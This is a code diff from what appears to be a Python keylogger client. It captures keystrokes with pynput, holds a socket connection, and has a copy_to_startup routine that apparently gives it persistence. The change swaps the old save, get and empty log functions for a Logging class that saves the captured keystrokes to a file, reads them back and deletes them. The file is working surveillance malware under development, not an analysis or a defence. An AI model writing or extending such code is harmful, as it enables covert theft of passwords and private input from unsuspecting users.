@@ -1,5 +1,5 @@
 from pynput.keyboard import Listener
-from os import system, getenv, getlogin, makedirs
+from os import system, getenv, getlogin, makedirs, remove
 import socket
 from pickle import dumps
 Header = 10
@@ -10,6 +10,53 @@ class Global:
     key_array = []
     i = 0
     local_log = False
+
+
+class Logging:
+
+    def __init__(self, path_to_file):
+        self.path = path_to_file
+
+    def return_log(self):
+        # Method to check whether log_file is created and to return its content
+        try:
+            x = open(self.path, "rb")
+            log = x.read()
+        except FileNotFoundError:
+            return None
+        x.close()
+        return log
+
+    def save_log(self, array, create_log=True):
+        # Method to save log and to create it if not present
+        try:
+            if create_log:
+                # create file if not present
+                x = open(self.path, "a+")
+                for char in array:
+                    x.write(char)
+                x.close()
+            else:
+                # do not create file if not present
+                x = open(self.path, "a")
+                for char in array:
+                    x.write(char)
+                x.close()
+        except(FileNotFoundError, PermissionError):
+            return False
+        return True
+
+    def empty_log(self, rm_file=False):
+        # Method to delete file content or the entire file
+        try:
+            if rm_file:
+                remove(self.path)
+            else:
+                x = open(self.path, "wb")
+                x.close()
+        except(FileNotFoundError, PermissionError):
+            return False
+        return True
 
 
 class Socket:
@@ -89,28 +136,6 @@ def copy_to_startup(file_name):
         with open("blanc_client.txt", "r")as x:
             blanc = x.read()
         f.write(blanc)
-
-
-def save_log(array_to_save):
-    with open(Global.log_file_path, "a+")as f:
-        for char in array_to_save:
-            f.write(char)
-    Global.local_log = True
-
-
-def get_log():
-    temp_array = []
-    with open(Global.log_file_path, "r")as f:
-        log = f.read()
-    for char in log:
-        temp_array.append(char)
-    return temp_array
-
-
-def empty_log():
-    with open(Global.log_file_path, "w+")as f:
-        f.write("")
-    Global.local_log = False
 
 
 connection_established = Socket()
